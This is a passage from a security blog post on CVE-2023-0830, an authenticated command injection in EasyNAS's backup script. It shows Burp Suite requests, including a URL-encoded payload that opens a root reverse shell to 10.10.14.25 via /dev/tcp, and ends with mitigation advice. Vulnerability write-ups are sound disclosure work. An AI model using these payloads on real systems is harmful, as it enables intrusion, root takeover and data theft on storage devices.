structure:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003e|command|command||a #\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eBreaking this down:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe first \u003ccode\u003e|\u003c/code\u003e terminates the original command and starts a new one\u003c/li\u003e\n\u003cli\u003eThe second \u003ccode\u003e|\u003c/code\u003e pipes the output of the first command to the next command\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e||a\u003c/code\u003e creates a fallback command that will run if the previous command fails (\u003ccode\u003ea\u003c/code\u003e is just a non-existent command)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e#\u003c/code\u003e comments out the remainder of the original command to prevent syntax errors\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003ePrivilege Escalation Mechanism\u003c/h3\u003e\n\u003cp\u003eThis vulnerability provides a direct privilege escalation path because the web interface runs the backup script with the permissions of the web server user, but the script uses \u003ccode\u003esudo\u003c/code\u003e to execute the tar command without requiring a password. This sudo configuration allows the web server user to run this specific tar command with root privileges. When we inject our commands using the pipe character, they inherit the sudo context and execute with root privileges, even though they're technically separate from the original tar command.\u003c/p\u003e\n\u003ch2\u003eExploitation Process Using Burp Suite\u003c/h2\u003e\n\u003cp\u003eI exploited the vulnerability by intercepting a legitimate backup request in Burp Suite that looked like:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGET /easynas/backup.pl?action=backup\u0026#x26;menu=none\u0026#x26;.submit=Backup\u0026#x26;name=backup_20230209\u0026#x26;vol=datastore HTTP/1.1\nHost: easynas.local\nCookie: session_id=abcdef123456\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe \u003ccode\u003ename\u003c/code\u003e parameter contained a filename used in the backup command, making it ideal for command injection. I modified the request in Burp Suite's Repeater tab, changing the \u003ccode\u003ename\u003c/code\u003e parameter to include command injection characters:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGET /easynas/backup.pl?action=backup\u0026#x26;menu=none\u0026#x26;.submit=Backup\u0026#x26;name=%7cwhoami%7c%7ca%20%23\u0026#x26;vol=datastore HTTP/1.1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhen sent, the server response indicated successful command execution with root privileges. For a practical demonstration, I developed a final payload that establishes a reverse shell with root privileges:\u003c/p\u003e\n\u003cpre class=\"language-none\"\u003e\u003ccode class=\"language-none\"\u003eGET /easynas/backup.pl?action=backup\u0026#x26;menu=none\u0026#x26;.submit=Backup\u0026#x26;name=%7c/bin/bash%20%7c%20bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.25/443%200%3E%261%27%7c%7ca%20%23\u0026#x26;vol=datastore HTTP/1.1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis payload uses URL encoding for special characters and works by breaking out of the original command, executing bash, piping to another bash instance that runs the reverse shell command, all with inherited root privileges from the sudo context of the vulnerable script.\u003c/p\u003e\n\u003ch2\u003eReal-World Attack Scenario\u003c/h2\u003e\n\u003cp\u003eIn a real attack, an adversary would identify an EasyNAS instance through network scanning, authenticate using common credentials, and deploy the exploit to establish a reverse shell. With root access, they could exfiltrate all data stored on the NAS, install persistence mechanisms, pivot to other internal systems, or modify system configurations to maintain access. This vulnerability is particularly concerning for internet-exposed devices, as attackers could gain complete control of the storage system with minimal effort.\u003c/p\u003e\n\u003ch2\u003eMitigation\u003c/h2\u003e\n\u003cp\u003eTo fix this vulnerability, implement strict input validation with a whitelist approach, use prepared statements or parameterized APIs where possible, avoid using sudo in scripts (especially for web applications), implement proper privilege separation, and apply the principle of least privilege throughout the application. The fix could be as simple as using the Perl module CGI.pm's built-in param method to sanitize user input, or enabling Taint mode to treat all user input as potentially dangerous.\u003c/p\u003e\n\u003ch2\u003eConclusion\u003c/h2\u003e\n\u003cp\u003eThis vulnerability in EasyNAS shows how even seemingly minor implementation details can lead to critical security issues. What makes this vulnerability particularly interesting is how easily it was discovered using basic penetration testing tools, yet it was overlooked during development.\u003c/p\u003e\n\u003cp\u003eThe lesson here is that proper input validation is critical, especially when user input is passed to system commands. Even in authenticated areas of applications, user input should never be trusted.\u003c/p\u003e\n\u003cp\u003eKeep your systems updated and be aware of vulnerabilities, even in open-source software like EasyNAS. Take the necessary steps to protect your systems - especially network storage devices that often contain your most sensitive data.\u003c/p\u003e\n\u003ch2\u003eReferences\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.exploit-db.com/exploits/51266\"\u003eEasyNAS 1.1.0 — Authenticated OS Command Injection Exploit (github.com)\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2023-0830\"\u003eCVE-2023-0830\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://vuldb.com/?id.220950\"\u003eVulDB Entry 220950\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.\u003c/em\u003e\u003c/p\u003e\n","excerpt":"Recently, I discovered a vulnerability in a backup and restore script used in EasyNAS, a popular open-source network-attached storage solution. The vulnerabi...","title":"Finding and Exploiting CVE-2023-0830 in EasyNas","date":"2023-03-18","tags":["Vulnerability Research","Command Injection","CVE","EasyNAS","Exploit Development","Privilege Escalation"]}},"__N_SSG":true},"page":"/blog/[slug]","query":{"slug":"cve-2023-0830"},"buildId":"-GeIpzgY1ncd3AosHRXyb","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>